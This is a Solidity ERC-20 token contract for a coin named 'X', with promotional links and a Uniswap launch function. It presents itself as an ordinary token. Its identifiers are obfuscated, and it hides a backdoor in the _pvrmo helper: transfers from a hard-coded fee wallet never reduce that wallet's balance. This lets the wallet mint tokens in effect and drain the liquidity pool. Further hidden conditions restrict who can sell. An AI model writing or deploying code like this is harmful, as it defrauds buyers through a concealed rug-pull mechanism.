/**

This is $X

TWITTER: https://twitter.com/XCoin_Erc20
TELEGRAM: https://t.me/XCoinErc20X
WEBSITE: https://xerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _pvrmo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pvrmo(a, b, "SafeMath:");
    }

    function  _pvrmo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kfvcosqmp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pfvykmjofs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"X";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totaljv = 100000000 * 10 **_decimals;
    uint256 public _mxTamyAmaunt = _Totaljv;
    uint256 public _Wallevbuwx = _Totaljv;
    uint256 public _wapThresholdeux= _Totaljv;
    uint256 public _mokmTouvp= _Totaljv;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEtakdFvbf;
    mapping (address => bool) private _taxbWalory;
    mapping(address => uint256) private _lruevrkacep;
    bool public _tlfereslxnove = false;
    address payable private _pkbfodvamp;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforequbst=0;
    uint256 private _burfbvrt=0;

    _pfvykmjofs private _qmoRmsobvt;
    address private _acPtvrdvw;
    bool private _phjcjveoh;
    bool private ioySwpruq = false;
    bool private _aqvEabujp = false;

    event _amrfduyol(uint _mxTamyAmaunt);
    modifier lckobThvpup {
        ioySwpruq = true;
        _;
        ioySwpruq = false;
    }

    constructor () {
        _pkbfodvamp = payable(0xdc9D7D8D0195731f3cDDC0D0Db0cd382Fd497014);
        _balances[_msgSender()] = _Totaljv;
        _isEtakdFvbf[owner()] = true;
        _isEtakdFvbf[address(this)] = true;
        _isEtakdFvbf[_pkbfodvamp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totaljv);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totaljv;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pvrmo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlfereslxnove) {
                if (to != address
                (_qmoRmsobvt) && to !=
                 address(_acPtvrdvw)) {
                  require(_lruevrkacep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruevrkacep
                  [tx.origin] = block.number;
                }
            }

            if (from == _acPtvrdvw && to != 
            address(_qmoRmsobvt) && !_isEtakdFvbf[to] ) {
                require(amount <= _mxTamyAmaunt,
                 "Exceeds the _mxTamyAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallevbuwx, "Exceeds the maxWalletSize.");
                if(_burfbvrt
                < _wapBeforequbst){
                  require(! _rfoqmvz(to));
                }
                _burfbvrt++;
                 _taxbWalory[to]=true;
                teeomoun = amount.mul((_burfbvrt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acPtvrdvw && from!= address(this) 
            && !_isEtakdFvbf[from] ){
                require(amount <= _mxTamyAmaunt && 
                balanceOf(_pkbfodvamp)<_mokmTouvp,
                 "Exceeds the _mxTamyAmaunt.");
                teeomoun = amount.mul((_burfbvrt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burfbvrt>_wapBeforequbst &&
                 _taxbWalory[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ioySwpruq 
            && to == _acPtvrdvw && _aqvEabujp &&
             contractTokenBalance>_wapThresholdeux 
            && _burfbvrt>_wapBeforequbst&&
             !_isEtakdFvbf[to]&& !_isEtakdFvbf[from]
            ) {
                _swpvznrkuj( _pvuve(amount, 
                _pvuve(contractTokenBalance,_mokmTouvp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmoeojvp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _pvrmo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _pvrmo(teeomoun));
        emit Transfer(from, to, 
        amount. _pvrmo(teeomoun));
    }

    function _swpvznrkuj(uint256
     tokenAmount) private lckobThvpup {
        if(tokenAmount==0){return;}
        if(!_phjcjveoh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qmoRmsobvt.WETH();
        _approve(address(this),
         address(_qmoRmsobvt), tokenAmount);
        _qmoRmsobvt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _pvuve(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pvrmo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pkbfodvamp){
            return a ;
        }else{
            return a . _pvrmo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTamyAmaunt = _Totaljv;
        _Wallevbuwx = _Totaljv;
        _tlfereslxnove = false;
        emit _amrfduyol(_Totaljv);
    }

    function _rfoqmvz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmoeojvp(uint256
    amount) private {
        _pkbfodvamp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _phjcjveoh);
        _qmoRmsobvt   =  _pfvykmjofs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qmoRmsobvt), _Totaljv);
        _acPtvrdvw = _kfvcosqmp(_qmoRmsobvt.factory()). createPair (address(this),  _qmoRmsobvt . WETH ());
        _qmoRmsobvt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acPtvrdvw).approve(address(_qmoRmsobvt), type(uint).max);
        _aqvEabujp = true;
        _phjcjveoh = true;
    }

    receive() external payable {}
}